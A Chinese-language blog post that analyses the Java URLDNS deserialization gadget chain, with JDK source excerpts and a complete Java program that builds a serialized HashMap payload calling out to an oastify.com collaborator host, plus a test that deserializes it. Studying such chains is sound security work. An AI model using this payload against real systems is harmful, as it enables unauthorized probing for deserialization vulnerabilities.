# URLDNS链分析


<!--more-->

# URLDNS链分析

## 1、URLDNS原理

1、 java.util.HashMap重写了readObject方法：

 在反序列化时会调用 hash 函数计算 key 的 hashCode

2、java.net.URL对象的 hashCode 在计算时会调用 getHostAddress 方法

3、getHostAddress方法从而解析域名发出 DNS 请求

**利用链：**

```
Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
```

接下来进行逐一分析：

这个链反序列化的对象是`HashMap`的对象。反序列化`HashMap`的时候会用到这个类自定义的`readObject`：

```java
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

<img src="https://s1.vika.cn/space/2023/04/10/6addeb48db1c4067b40ff3503667cf21" style="zoom:80%;" />

注意到最后的`putVal(hash(key), key, value, false, false);`，调用了`hash`函数计算哈希值

跟进hash函数：

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

这里调用了键的`hashCode`函数。我们该链中是将其设置成URL类，查看URL类的hashCode函数

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

如果`hashCode==-1`的话，就会重新计算`hashCode`，调用`handler`的`hashCode()`。看一下`handler`：

```java
    transient URLStreamHandler handler;
```

`handler`属性是`URLStreamHandler`类的对象，所以继续跟进`URLStreamHandler`类的`hashCode()`方法：

<img src="https://s1.vika.cn/space/2023/04/10/c040765814824f8f941c1c7f6a09bfce" style="zoom:80%;" />

继续跟进`getHostAddress()`：

<img src="https://s1.vika.cn/space/2023/04/10/37225da516f54e3e9ca869e978687e04" style="zoom: 80%;" />

这⾥ `InetAddress.getByName(host) `的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。

## 2、利用

一个很奇妙的点就在于，`HashMap`里面最常用的`put`方法里面居然就有：

```
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```

理论来说这样使用一次put就会触发一次URLDNS

**那个`key`，即`URL`类的对象的`hashCode`属性值为-1**

考虑到最开始调用`put()`，虽然没有触发`URLDNS`，但是同样调用了`hash()`，导致了传入的`URL`类对象的哈希值被计算了一次，`hashCode`不再是`-1`了，因此还需要再修改它的`hashCode`属性。但是注意这个属性是`private`：

```java
    private int hashCode = -1;
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

因此只能用反射：

```java
        //反射获取 URL的hashcode方法
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        //使用内部方法
        f.setAccessible(true);
        // put 一个值的时候就不会去查询 DNS，避免和刚刚混淆
        f.set(url, 0xdeadbeef);
        hashMap.put(url, "123");
        // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
        f.set(url, -1);
```

这样就能修改hashCode为-1

故整体代码如下：

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class URLDNS {
    public static void main(String[] args) throws Exception {

        //漏洞出发点 hashmap，实例化出来
        HashMap<URL, String> hashMap = new HashMap<URL, String>();

        //URL对象传入自己测试的dnslog
        URL url = new URL("http://1tvcx6l0a7bgc6ztu31ydi4zeqki88wx.oastify.com");

        //反射获取 URL的hashcode方法
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");

        //使用内部方法
        f.setAccessible(true);

        // put 一个值的时候就不会去查询 DNS，避免和刚刚混淆
        f.set(url, 0xdeadbeef);
        hashMap.put(url, "123");

        // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
        f.set(url, -1);

        //序列化成对象，输出出来
        ObjectOutputStream objos = new ObjectOutputStream(new FileOutputStream("./out.bin"));
        objos.writeObject(hashMap);
    }
}
```

运行序列化过程，查看是否有DNS解析记录发现没有，因为在put之前修改了hashCode的值为非-1这样就不会参与解析，避免跟反序列化构成中的解析混淆

我们执行反序列化过程

```java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class test {
    public static void main(String[] args) throws Exception {
        //读取目标
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("./out.bin"));
        //反序列化
        ois.readObject();
    }
}
```

看到解析记录

<img src="https://s1.vika.cn/space/2023/04/10/e680d812cf7c47aaa296c63b8ab2a977" style="zoom:80%;" />


---

> 作者: [xunruo](https://xunruo.top)  
> URL: https://xunruo.top/post/a0fd0c84/  

